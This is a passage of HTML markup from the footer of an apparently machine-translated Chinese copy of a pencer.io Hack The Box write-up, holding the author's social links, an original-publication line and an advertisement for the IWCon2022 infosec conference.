jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="f534" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—【https://twitter.com/pencer_io】T4<br/>网站— <a class="ae np" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="4875" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">原载于2022年1月30日</em><a class="ae np" href="https://pencer.io/ctf/ctf-htb-horizontall" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">。</em></p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><h1 id="4408" class="kl km iq bd kn ko ob kq kr ks oc ku kv kw od ky kz la oe lc ld le of lg lh li bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae np" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="lr ls gp gr lt lu"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="lv ab fo"><div class="lw ab lx cl cj ly"><h2 class="bd ir gy z fp lz fr fs ma fu fw ip bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="mb l"><h3 class="bd b gy z fp lz fr fs ma fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="mc l"><p class="bd b dl z fp lz fr fs ma fu fw dk translated">iwcon.live</p></div></div><div class="md l"><div class="og l mf mg mh md mi lp lu"/></div></div></a></div></div></div>    
</body>
</html>